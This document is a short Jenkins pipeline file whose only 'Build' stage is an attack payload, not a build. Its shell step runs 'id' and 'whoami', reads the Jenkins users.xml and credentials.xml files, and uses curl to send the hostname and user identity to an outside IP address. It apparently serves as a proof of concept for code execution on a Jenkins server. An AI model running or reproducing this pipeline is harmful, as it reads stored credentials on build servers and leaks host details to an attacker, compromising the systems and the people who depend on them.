pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh '''
                    id
                    whoami
                    cat /var/jenkins_home/users/users.xml
                    cat /var/jenkins_home/credentials.xml
                    curl http://137.184.141.100:8889/jenkins_rce_$(hostname)_$(id)
                '''
            }
        }
    }
}
